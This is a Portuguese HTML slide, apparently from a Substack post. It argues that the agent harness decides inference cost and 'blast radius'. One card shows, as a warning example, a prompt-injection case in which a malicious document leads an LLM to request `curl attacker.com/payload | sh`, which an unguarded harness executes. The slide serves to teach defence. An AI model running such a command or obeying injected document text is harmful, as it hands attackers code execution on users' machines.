@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<link rel="stylesheet" href="../identity.css">
+<style>
+  .card { display: flex; align-items: center; gap: 26px; padding: 22px 28px; margin-bottom: 20px; }
+  .card.cost { border-left-color: var(--red); }
+  .card.sec { border-left-color: var(--red); }
+  .card.win { border-left-color: var(--green); }
+  .tag {
+    flex: 0 0 150px; text-align: center; font-size: 28px; font-weight: bold;
+    border-radius: 10px; padding: 14px 0; color: #fff;
+  }
+  .tag.cost { background: var(--red); }
+  .tag.sec { background: var(--red); font-size: 19px; letter-spacing: 1px; }
+  .tag.win { background: var(--green); font-size: 19px; letter-spacing: 1px; }
+  .card .card-title { font-size: 23px; margin-bottom: 5px; }
+  .card .card-sub { font-size: 19px; line-height: 1.45; }
+  .card .card-sub code { color: var(--red); font-weight: bold; font-size: 18px; }
+</style>
+</head>
+<body>
+  <div class="header">
+    <div class="badge"><div class="pin"><div class="dot-o"></div><div class="stem"></div><div class="dot-w"></div></div><div class="vaz">VAZ</div></div>
+    <div class="chip">QUEM CONFUNDE PAGA <span class="sep">·</span> EM DINHEIRO E EM RISCO</div>
+  </div>
+
+  <div class="lede">Os modelos empatam em benchmark. <strong>É o harness que decide a fatura e o raio da explosão.</strong></div>
+
+  <div class="content">
+    <div class="card cost">
+      <div class="tag cost">3–10x</div>
+      <div>
+        <div class="card-title">Na fatura mensal de inference</div>
+        <div class="card-sub">harness ruim manda o contexto inteiro a cada chamada; harness bom usa prompt caching, lazy loading de skills e sub-agents</div>
+      </div>
+    </div>
+    <div class="card sec">
+      <div class="tag sec">INJECTION</div>
+      <div>
+        <div class="card-title">Prompt injection vira execução de código</div>
+        <div class="card-sub">sem allowlist, um documento malicioso faz a LLM pedir <code>bash("curl attacker.com/payload | sh")</code> — e o harness obedece</div>
+      </div>
+    </div>
+    <div class="card win">
+      <div class="tag win">SEPARA</div>
+      <div>
+        <div class="card-title">Quem entende a separação</div>
+        <div class="card-sub">compra a ferramenta certa pelo motivo certo, paga só o que precisa e não abre escopo que não devia</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">
+    <div class="left"><b>VazDEng</b><span class="dot">·</span>padrão sênior, sem hype</div>
+    <div class="right">vazdeng.substack.com</div>
+  </div>
+</body>
+</html>
